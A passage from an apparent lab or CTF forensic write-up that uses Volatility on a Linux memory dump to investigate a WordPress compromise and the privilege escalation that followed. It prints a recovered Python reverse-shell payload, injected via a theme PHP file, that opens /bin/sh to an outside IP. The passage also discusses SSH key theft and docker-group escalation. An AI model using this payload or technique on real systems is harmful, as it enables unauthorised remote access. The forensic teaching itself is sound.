</span></span><span class=line><span class=cl>   <span class=m>2778</span> 192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:53:18 +0100<span class=o>]</span> <span class=s2>&#34;POST /wp-admin/admin-ajax.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>431</span> <span class=s2>&#34;http://192.168.122.216/wp-admin/theme-editor.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X   2778 11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>   <span class=m>2779</span> ::1 - - <span class=o>[</span>27/Dec/2018:20:53:24 +0100<span class=o>]</span> <span class=s2>&#34;OPTIONS * HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>126</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Apache/2.4.25 (Debian) (internal dummy connection)&#34;</span>
</span></span><span class=line><span class=cl>   <span class=m>2780</span> 192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:53:25 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&amp;theme=rock-band HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>11888</span> <span class=s2>&#34;http://192.168.122.2   2780 16/wp-admin/theme-editor.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>The web page <code>theme-editor</code>, its name is explicit. With Odie we wonder why Monique edited the WordPress theme. She doesn&rsquo;t like Iron Maiden?</p><p>Odie followed the URL found in the log:</p><blockquote><p>http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&theme=rock-band</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_4.png></p><p>At the very first view, nothing really awful over there. But Monique edited a PHP web page: <code>customizer.php</code>. We can hypothesize that the evil hacker injects arbitrary PHP code in this page in order to get access on the Debian server.</p><p>Unfortunately, Monique removed her arbitrary code before leaving, so no proof&mldr; Even in the memory dump, there doesn&rsquo;t seem to be much:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat pfile_list<span class=p>|</span> grep <span class=s2>&#34;rock-band&#34;</span>     
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/www/html/wp-content/languages/themes/rock-band-fr_FR.mo
</span></span><span class=line><span class=cl>          <span class=m>532630</span> 0xffff979692ed5948 /bin/bin/var/www/html/wp-content/themes/rock-band
</span></span><span class=line><span class=cl>          <span class=m>532646</span> 0xffff979692ef9a88 /bin/bin/var/www/html/wp-content/themes/rock-band/functions.php
</span></span><span class=line><span class=cl>          <span class=m>532639</span> 0xffff979692ef41a8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/customizer.php~
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ensibssecretproject
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ens
</span></span><span class=line><span class=cl>          <span class=m>532643</span> 0xffff979692ef5a48 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/override-parent.php
</span></span><span class=line><span class=cl>          <span class=m>532640</span> 0xffff979692ef45d8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox
</span></span><span class=line><span class=cl>          <span class=m>532641</span> 0xffff979692ef4a08 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox/metabox.php
</span></span><span class=line><span class=cl>          <span class=m>532631</span> 0xffff979692ed50e8 /bin/bin/var/www/html/wp-content/themes/rock-band/languages
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/languages/fr_FR.mo
</span></span></code></pre></td></tr></table></div></div><p>I can still see this:</p><ul><li>customizer.php~</li><li>ensibssecretproject</li></ul><p>The first file is follow by the <code>~</code> suffix, probably for temporary files. If we would manage to recover this file, we probably could get the arbitrary code.</p><p>The second one, is an ENSIBS project of Odie, finding this file in this place is quite surprising.</p><p>Let&rsquo;s look for <code>customizer.php</code> string in memory, with the yarascan plugin from Volatility and see where it appears:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y <span class=s2>&#34;customizer.php&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Task: apache2 pid <span class=m>21733</span> rule r1 addr 0x7f0733fb39b7
</span></span><span class=line><span class=cl>0x7f0733fb39b7  <span class=m>63</span> <span class=m>75</span> <span class=m>73</span> <span class=m>74</span> 6f 6d <span class=m>69</span> 7a <span class=m>65</span> <span class=m>72</span> 2e <span class=m>70</span> <span class=m>68</span> <span class=m>70</span> 3f <span class=m>78</span>   customizer.php?x
</span></span><span class=line><span class=cl>0x7f0733fb39c7  3d <span class=m>70</span> <span class=m>79</span> <span class=m>74</span> <span class=m>68</span> 6f 6e <span class=m>25</span> <span class=m>32</span> <span class=m>30</span> 2d <span class=m>63</span> <span class=m>25</span> <span class=m>32</span> <span class=m>30</span> <span class=nv>25</span>   <span class=o>=</span>python%20-c%20%
</span></span><span class=line><span class=cl>0x7f0733fb39d7  <span class=m>32</span> <span class=m>37</span> <span class=m>69</span> 6d <span class=m>70</span> 6f <span class=m>72</span> <span class=m>74</span> <span class=m>25</span> <span class=m>32</span> <span class=m>30</span> <span class=m>73</span> 6f <span class=m>63</span> 6b <span class=m>65</span>   27import%20socke
</span></span><span class=line><span class=cl>0x7f0733fb39e7  <span class=m>74</span> 2c <span class=m>73</span> <span class=m>75</span> <span class=m>62</span> <span class=m>70</span> <span class=m>72</span> 6f <span class=m>63</span> <span class=m>65</span> <span class=m>73</span> <span class=m>73</span> 2c 6f <span class=m>73</span> 3b   t,subprocess,os<span class=p>;</span>
</span></span><span class=line><span class=cl>0x7f0733fb39f7  <span class=m>73</span> 3d <span class=m>73</span> 6f <span class=m>63</span> 6b <span class=m>65</span> <span class=m>74</span> 2e <span class=m>73</span> 6f <span class=m>63</span> 6b <span class=m>65</span> <span class=m>74</span> <span class=m>28</span>   <span class=nv>s</span><span class=o>=</span>socket.socket<span class=o>(</span>
</span></span><span class=line><span class=cl>0x7f0733fb3a07  <span class=m>73</span> 6f <span class=m>63</span> 6b <span class=m>65</span> <span class=m>74</span> 2e <span class=m>41</span> <span class=m>46</span> 5f <span class=m>49</span> 4e <span class=m>45</span> <span class=m>54</span> 2c <span class=m>73</span>   socket.AF_INET,s
</span></span><span class=line><span class=cl>0x7f0733fb3a17  6f <span class=m>63</span> 6b <span class=m>65</span> <span class=m>74</span> 2e <span class=m>53</span> 4f <span class=m>43</span> 4b 5f <span class=m>53</span> <span class=m>54</span> <span class=m>52</span> <span class=m>45</span> <span class=m>41</span>   ocket.SOCK_STREA
</span></span><span class=line><span class=cl>0x7f0733fb3a27  4d <span class=m>29</span> 3b <span class=m>73</span> 2e <span class=m>63</span> 6f 6e 6e <span class=m>65</span> <span class=m>63</span> <span class=m>74</span> <span class=m>28</span> <span class=m>28</span> <span class=m>25</span> <span class=m>32</span>   M<span class=o>)</span><span class=p>;</span>s.connect<span class=o>((</span>%2
</span></span><span class=line><span class=cl>0x7f0733fb3a37  <span class=m>32</span> <span class=m>31</span> <span class=m>39</span> <span class=m>32</span> 2e <span class=m>31</span> <span class=m>36</span> <span class=m>38</span> 2e <span class=m>31</span> <span class=m>32</span> <span class=m>32</span> 2e <span class=m>31</span> <span class=m>35</span> <span class=m>38</span>   2192.168.122.158
</span></span><span class=line><span class=cl>0x7f0733fb3a47  <span class=m>25</span> <span class=m>32</span> <span class=m>32</span> 2c <span class=m>33</span> <span class=m>36</span> <span class=m>31</span> <span class=m>35</span> <span class=m>29</span> <span class=m>29</span> 3b 6f <span class=m>73</span> 2e <span class=m>64</span> <span class=m>75</span>   %22,3615<span class=o>))</span><span class=p>;</span>os.du
</span></span><span class=line><span class=cl>0x7f0733fb3a57  <span class=m>70</span> <span class=m>32</span> <span class=m>28</span> <span class=m>73</span> 2e <span class=m>66</span> <span class=m>69</span> 6c <span class=m>65</span> 6e 6f <span class=m>28</span> <span class=m>29</span> 2c <span class=m>30</span> <span class=m>29</span>   p2<span class=o>(</span>s.fileno<span class=o>()</span>,0<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7f0733fb3a67  3b <span class=m>25</span> <span class=m>32</span> <span class=m>30</span> 6f <span class=m>73</span> 2e <span class=m>64</span> <span class=m>75</span> <span class=m>70</span> <span class=m>32</span> <span class=m>28</span> <span class=m>73</span> 2e <span class=m>66</span> <span class=m>69</span>   <span class=p>;</span>%20os.dup2<span class=o>(</span>s.fi
</span></span><span class=line><span class=cl>0x7f0733fb3a77  6c <span class=m>65</span> 6e 6f <span class=m>28</span> <span class=m>29</span> 2c <span class=m>31</span> <span class=m>29</span> 3b <span class=m>25</span> <span class=m>32</span> <span class=m>30</span> 6f <span class=m>73</span> 2e   leno<span class=o>()</span>,1<span class=o>)</span><span class=p>;</span>%20os.
</span></span><span class=line><span class=cl>0x7f0733fb3a87  <span class=m>64</span> <span class=m>75</span> <span class=m>70</span> <span class=m>32</span> <span class=m>28</span> <span class=m>73</span> 2e <span class=m>66</span> <span class=m>69</span> 6c <span class=m>65</span> 6e 6f <span class=m>28</span> <span class=m>29</span> 2c   dup2<span class=o>(</span>s.fileno<span class=o>()</span>,
</span></span><span class=line><span class=cl>0x7f0733fb3a97  <span class=m>32</span> <span class=m>29</span> 3b <span class=m>70</span> 3d <span class=m>73</span> <span class=m>75</span> <span class=m>62</span> <span class=m>70</span> <span class=m>72</span> 6f <span class=m>63</span> <span class=m>65</span> <span class=m>73</span> <span class=m>73</span> 2e   2<span class=o>)</span><span class=p>;</span><span class=nv>p</span><span class=o>=</span>subprocess.
</span></span><span class=line><span class=cl>0x7f0733fb3aa7  <span class=m>63</span> <span class=m>61</span> 6c 6c <span class=m>28</span> 5b <span class=m>25</span> <span class=m>32</span> <span class=m>32</span> 2f <span class=m>62</span> <span class=m>69</span> 6e 2f <span class=m>73</span> <span class=m>68</span>   call<span class=o>([</span>%22/bin/sh
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>We can notice something really strange, it could be dangerous:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p <span class=m>21733</span> &gt; papache_customizerphp
</span></span><span class=line><span class=cl>$ cat papache_customizerphp<span class=p>|</span> grep 7f0733fb        
</span></span><span class=line><span class=cl>0xffff9796baa41000    <span class=m>21733</span> apache2              0x00007f0733fae000 0x00007f0733fb4000 rw-                   0x0      <span class=m>0</span>      <span class=m>0</span>          <span class=m>0</span> 
</span></span><span class=line><span class=cl>0xffff9796baa41000    <span class=m>21733</span> apache2              0x00007f0733fb4000 0x00007f0733fc4000 rwx                   0x0      <span class=m>0</span>      <span class=m>0</span>          <span class=m>0</span> 
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f0733fae000 -p <span class=m>21733</span> -D .
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>Task       VM Start           VM End                         Length Path
</span></span><span class=line><span class=cl>---------- ------------------ ------------------ ------------------ ----
</span></span><span class=line><span class=cl>     <span class=m>21733</span> 0x00007f0733fae000 0x00007f0733fb4000             0x6000 ./task.21733.0x7f0733fae000.vma
</span></span><span class=line><span class=cl>$ strings ./task.21733.0x7f0733fae000.vma <span class=p>|</span> grep customizer.php
</span></span><span class=line><span class=cl>band/inc/customizer.php47
</span></span><span class=line><span class=cl>51%<span class=se>\G</span>ET /wp-content/themes/rock-band/inc/customizer.php?x<span class=o>=</span>python%20-c%20%27import%20socket,subprocess,os<span class=p>;</span><span class=nv>s</span><span class=o>=</span>socket.socket<span class=o>(</span>socket.AF_INET,socket.SOCK_STREAM<span class=o>)</span><span class=p>;</span>s.connect<span class=o>((</span>%22192.168.122.158%22,3615<span class=o>))</span><span class=p>;</span>os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,0<span class=o>)</span><span class=p>;</span>%20os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,1<span class=o>)</span><span class=p>;</span>%20os.dup2<span class=o>(</span>s.fileno<span class=o>()</span>,2<span class=o>)</span><span class=p>;</span><span class=nv>p</span><span class=o>=</span>subprocess.call<span class=o>([</span>%22/bin/sh%22,%22-i%22<span class=o>])</span><span class=p>;</span>%27 HTTP/1.1
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:21:08:21 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-content/themes/rock-band/inc/customizer.php?x=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.122.158%22,3615));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1&#34;</span> <span class=m>500</span> <span class=m>185</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>After URL decoding the data (thanks CyberChef), beautify the python code, it looks to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span><span class=o>,</span><span class=nn>subprocess</span><span class=o>,</span><span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span><span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;192.168.122.158&#34;</span><span class=p>,</span><span class=mi>3615</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>call</span><span class=p>([</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span><span class=s2>&#34;-i&#34;</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><p>The code is explicit, it gives an interactive <code>/bin/sh</code> to the suspicious IP address (IP owns by Monique) through a network socket on TCP port 3615. I think we found the arbitrary code injected: command execution in PHP.</p><h3 id=privilege-escalation>Privilege escalation</h3><p>We are starting to get a good look on actions made by Monique. However, there is something strange, what happened between the reverse shell and the backdoor?</p><p>Monique got an access as <strong>www-data</strong>, not as <strong>root</strong>. She must be doing at least one privilege escalation.</p><p>In fact, we could stop the investigation here. We know where the backdoor is, we know where is the entry point. In principle, if we correct these issues, Monique will no longer be able to get access to the Odie&rsquo;s VPS. But we&rsquo;re here to learn things and have fun! Then let&rsquo;s going further!</p><h4 id=www-data-to-odie>www-data to odie</h4><p>As we know, <strong>www-data</strong> got shell access the <code>27/12/2018 at 21:08:21</code>. In <code>auth.log</code> file, recovered from memory, we can see 10 minutes later an SSH connection using the Odie public key:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat auth.log <span class=p>|</span> grep -a <span class=s1>&#39;21:1&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:17:09 webserver sshd<span class=o>[</span>21876<span class=o>]</span>: Accepted publickey <span class=k>for</span> odie from 192.168.122.158 port <span class=m>36436</span> ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>I assume Odie&rsquo;s private key was stolen by Monique. She did at least two privilege escalation:</p><blockquote><p>www-data -> odie ; odie -> root</p></blockquote><p>The first privilege escalation will be hard to find because <strong>www-data</strong> doesn&rsquo;t have <code>.bash_history</code> files or other kinds of commands history. But, <strong>odie</strong> has his bash history, let&rsquo;s try to find out something useful:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_bash
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>     <span class=m>419</span> bash                 2018-12-27 18:31:58 UTC+0000   vim wrapper.c
</span></span><span class=line><span class=cl>     <span class=m>419</span> bash                 2018-12-27 18:32:20 UTC+0000   gcc wrapper.c -o ensibssecretproject
</span></span><span class=line><span class=cl>     <span class=m>419</span> bash                 2018-12-27 18:32:26 UTC+0000   chmod <span class=m>6775</span> ensibssecretproject 
</span></span><span class=line><span class=cl>     <span class=m>419</span> bash                 2018-12-27 18:32:29 UTC+0000   ./ensibssecretproject 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Odie has put a sticky bit on a binary, it may be a good lead to start digging.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y <span class=s2>&#34;ensibssecretproject&#34;</span> &gt; yarascan_ensibssecretproject
</span></span><span class=line><span class=cl>$ strings ./task.419.0x1598000.vma <span class=p>|</span> grep ensibs      
</span></span><span class=line><span class=cl>chmod <span class=m>6775</span> ensibssecretproject 
</span></span><span class=line><span class=cl>mv ensibssecretproject /usr/local/bin/
</span></span><span class=line><span class=cl>sudo mv ensibssecretproject /usr/local/bin/
</span></span><span class=line><span class=cl>gcc wrapper.c -o ensibssecretproject
</span></span><span class=line><span class=cl>./ensibssecretproject 
</span></span><span class=line><span class=cl>ls -la /usr/local/bin/ensibssecretproject
</span></span></code></pre></td></tr></table></div></div><p>Nothing unusual. Maybe a wrong lead?</p><h4 id=odie-to-root>odie to root</h4><p>The second privilege escalation will be easier to find! Let&rsquo;s take a look at running processes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_psaux &gt; plinux_psaux
</span></span><span class=line><span class=cl>$ cat plinux_psaux <span class=p>|</span> grep <span class=s2>&#34;0      0&#34;</span> <span class=p>|</span> grep -v <span class=s1>&#39;\[&#39;</span>
</span></span><span class=line><span class=cl><span class=m>1</span>      <span class=m>0</span>      <span class=m>0</span>      /sbin/init                                                      
</span></span><span class=line><span class=cl><span class=m>193</span>    <span class=m>0</span>      <span class=m>0</span>      /lib/systemd/systemd-journald                                   
</span></span><span class=line><span class=cl><span class=m>216</span>    <span class=m>0</span>      <span class=m>0</span>      /lib/systemd/systemd-udevd                                      
</span></span><span class=line><span class=cl><span class=m>324</span>    <span class=m>0</span>      <span class=m>0</span>      /usr/sbin/rsyslogd -n                                           
</span></span><span class=line><span class=cl><span class=m>343</span>    <span class=m>0</span>      <span class=m>0</span>      /usr/sbin/cron -f                                               
</span></span><span class=line><span class=cl><span class=m>344</span>    <span class=m>0</span>      <span class=m>0</span>      /lib/systemd/systemd-logind                                     
</span></span><span class=line><span class=cl><span class=m>371</span>    <span class=m>0</span>      <span class=m>0</span>      /sbin/agetty --noclear tty1 linux                               
</span></span><span class=line><span class=cl><span class=m>374</span>    <span class=m>0</span>      <span class=m>0</span>      /usr/sbin/sshd -D                                               
</span></span><span class=line><span class=cl><span class=m>393</span>    <span class=m>0</span>      <span class=m>0</span>      /sbin/dhclient -4 -v -pf /run/dhclient.enp1s0.pid -lf /var/lib/dhcp/dhclient.enp1s0.leases -I -df /var/lib/dhcp/dhclient6.enp1s0.leases enp1s0
</span></span><span class=line><span class=cl><span class=m>14659</span>  <span class=m>0</span>      <span class=m>0</span>      /usr/lib/packagekit/packagekitd                                 
</span></span><span class=line><span class=cl><span class=m>14670</span>  <span class=m>0</span>      <span class=m>0</span>      /usr/lib/policykit-1/polkitd --no-debug                         
</span></span><span class=line><span class=cl><span class=m>16169</span>  <span class=m>0</span>      <span class=m>0</span>      /usr/bin/containerd                                             
</span></span><span class=line><span class=cl><span class=m>16290</span>  <span class=m>0</span>      <span class=m>0</span>      /usr/bin/dockerd -H unix://                                     
</span></span><span class=line><span class=cl><span class=m>21462</span>  <span class=m>0</span>      <span class=m>0</span>      /usr/sbin/apache2 -k start                                      
</span></span><span class=line><span class=cl><span class=m>22347</span>  <span class=m>0</span>      <span class=m>0</span>      sudo su                                                         
</span></span><span class=line><span class=cl><span class=m>22348</span>  <span class=m>0</span>      <span class=m>0</span>      su                                                              
</span></span><span class=line><span class=cl><span class=m>22349</span>  <span class=m>0</span>      <span class=m>0</span>      bash                                                            
</span></span><span class=line><span class=cl><span class=m>22887</span>  <span class=m>0</span>      <span class=m>0</span>      sudo insmod lime-4.9.0-8-amd64.ko <span class=nv>path</span><span class=o>=</span>/home/odie/memory.dmp <span class=nv>format</span><span class=o>=</span>lime <span class=nv>timeout</span><span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>22888</span>  <span class=m>0</span>      <span class=m>0</span>      insmod lime-4.9.0-8-amd64.ko <span class=nv>path</span><span class=o>=</span>/home/odie/memory.dmp <span class=nv>format</span><span class=o>=</span>lime <span class=nv>timeout</span><span class=o>=</span><span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>The <strong>odie</strong> user is in the group of only two processes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span> <span class=nv>groupes</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,108<span class=o>(</span>netdev<span class=o>)</span>,999<span class=o>(</span>docker<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>sudo</li><li>docker</li></ul><p>Sudoers rights got default configuration, then you need the <strong>odie</strong> password to run commands as root. The attacker wouldn&rsquo;t managed to gain <strong>root</strong> access from <code>sudo</code>. It remains <code>docker</code>.</p><p>The privilege escalation happened after <code>21:17:09</code>, it&rsquo;s the time of SSH key connection of Monique with the <strong>odie</strong> account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat auth.log <span class=p>|</span> grep -a <span class=s1>&#39;21:1&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:17:09 webserver sshd<span class=o>[</span>21876<span class=o>]</span>: Accepted publickey <span class=k>for</span> odie from 192.168.122.158 port <span class=m>36436</span> ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>$ cat daemon.log <span class=p>|</span> grep -a <span class=s2>&#34;21:&#34;</span> <span class=p>|</span> grep -E <span class=s2>&#34;docker|container&#34;</span>
